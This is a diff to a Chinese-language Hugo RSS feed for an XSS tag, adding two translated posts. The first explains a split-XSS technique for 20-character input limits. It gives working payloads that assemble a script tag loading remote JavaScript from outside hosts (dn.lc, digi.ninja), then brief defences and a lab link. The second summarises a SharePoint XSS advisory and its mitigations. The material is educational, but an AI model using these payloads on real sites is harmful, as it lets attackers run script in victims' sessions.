@@ -7,7 +7,134 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Fri, 01 Aug 2025 22:26:13 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/xss/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 02 Aug 2025 16:35:35 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/xss/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>分割XSS攻击载荷：突破20字符限制的技巧</title>
+        <link>http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</link>
+        <pubDate>Sat, 02 Aug 2025 16:35:35 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</guid>
+        <description>&lt;h1 id=&#34;split-xss---分割xss攻击载荷&#34;&gt;Split XSS - 分割XSS攻击载荷
+&lt;/h1&gt;&lt;h2 id=&#34;突破20字符限制的xss攻击技术&#34;&gt;突破20字符限制的XSS攻击技术
+&lt;/h2&gt;&lt;p&gt;在测试一个编辑表单时，我发现8个输入字段都存在XSS漏洞，但每个字段限制为20个字符。常规XSS攻击无法在如此短的字符限制下完成，于是我开发了以下技术：&lt;/p&gt;
+&lt;h3 id=&#34;基本攻击思路&#34;&gt;基本攻击思路
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;在第一个输入中开启&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签但不闭合：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;alert(1)/*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;在后续输入中闭合标签：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*/&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;字符分配策略&#34;&gt;字符分配策略
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;第一个字段：用12个字符闭合输入标签并开始脚本标签，剩余8个字符用于有效载荷&lt;/li&gt;
+&lt;li&gt;中间字段：每字段16个有效载荷字符（扣除4个字符用于注释标记）&lt;/li&gt;
+&lt;li&gt;最后字段：9个有效载荷字符（扣除11个字符用于闭合注释和脚本标签）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;实际攻击载荷示例&#34;&gt;实际攻击载荷示例
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt;&amp;lt;script&amp;gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/x=document/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/.createElement(/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/&amp;#34;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);x./*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/src=&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//dn.lc/s&amp;#34;;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/document.head./&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/appendChild(x);/&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;组合xss技术&#34;&gt;组合XSS技术
+&lt;/h2&gt;&lt;p&gt;当网站将两个输入字段组合显示时，可以：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在名字字段注入不完整的脚本标签：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abc&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//digi.ninja/script.js&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;在姓氏字段注入闭合标签：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;组合后形成完整标签：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abc&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//digi.ninja/script.js&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;防御措施&#34;&gt;防御措施
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;正确的输出编码是根本解决方案&lt;/li&gt;
+&lt;li&gt;输入验证可以作为辅助防御层&lt;/li&gt;
+&lt;li&gt;永远不要信任用户提供的内容&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://digi.ninja/labs/split_xss.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;完整测试实验室可在Split XSS Lab获取&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>SharePoint XSS漏洞技术分析与缓解措施</title>
+        <link>http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</link>
+        <pubDate>Sat, 02 Aug 2025 15:40:04 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</guid>
+        <description>&lt;h1 id=&#34;sharepoint-xss漏洞&#34;&gt;SharePoint XSS漏洞
+&lt;/h1&gt;&lt;p&gt;今天我们发布了安全公告983438，向客户通报SharePoint Server 2007和SharePoint Services 3.0中存在的跨站脚本(XSS)漏洞。以下是该漏洞的详细技术分析。&lt;/p&gt;
+&lt;h2 id=&#34;攻击向量分析&#34;&gt;攻击向量分析
+&lt;/h2&gt;&lt;p&gt;公告指出该漏洞可能导致SharePoint站点内的权限提升(EoP)。需要特别说明的是，这种权限提升并非从普通用户到工作站或服务器环境的管理员用户，而是攻击者可以在用户的SharePoint会话上下文中执行恶意脚本。最可能的攻击场景是：攻击者向已登录SharePoint服务器的用户发送恶意链接，当用户点击该链接时，攻击者嵌入的JavaScript将在点击者的用户上下文中执行。&lt;/p&gt;
+&lt;h2 id=&#34;缓解措施&#34;&gt;缓解措施
+&lt;/h2&gt;&lt;p&gt;SharePoint使用Http-Only cookies进行身份验证。由于HttpOnly cookies无法通过脚本访问，这显著降低了XSS攻击风险。更多信息请参考《使用HTTP-only Cookies缓解跨站脚本攻击》。&lt;/p&gt;
+&lt;p&gt;IE8的XSS过滤器在Internet区域默认启用，能拦截此类XSS攻击，因此IE8用户面临的风险较低。但该过滤器在本地Intranet区域默认禁用，可通过以下UI界面启用：&lt;/p&gt;
+&lt;p&gt;[图片：IE8 XSS过滤器启用界面]&lt;/p&gt;
+&lt;p&gt;管理员也可以通过组策略为任何区域启用或禁用XSS过滤器，详见《组策略与Internet Explorer 8》。&lt;/p&gt;
+&lt;h2 id=&#34;临时解决方案&#34;&gt;临时解决方案
+&lt;/h2&gt;&lt;p&gt;我们建议通过服务器端ACL设置限制help.aspx文件的访问。启用此方案后，您将无法查看SharePoint站点内的帮助内容。实施此缓解措施的用户可访问以下英文帮助内容作为替代：
+&lt;a class=&#34;link&#34; href=&#34;http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Jonathan Ness, David Ross和Chengyun Chu，MSRC工程团队
+&lt;em&gt;本文按&amp;quot;原样&amp;quot;提供，不作任何担保，也不授予任何权利。&lt;/em&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>利用Flash和base标签绕过XSS Auditor的技术分析</title>
         <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8flash%E5%92%8Cbase%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87xss-auditor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
         <pubDate>Fri, 01 Aug 2025 22:26:13 +0800</pubDate>
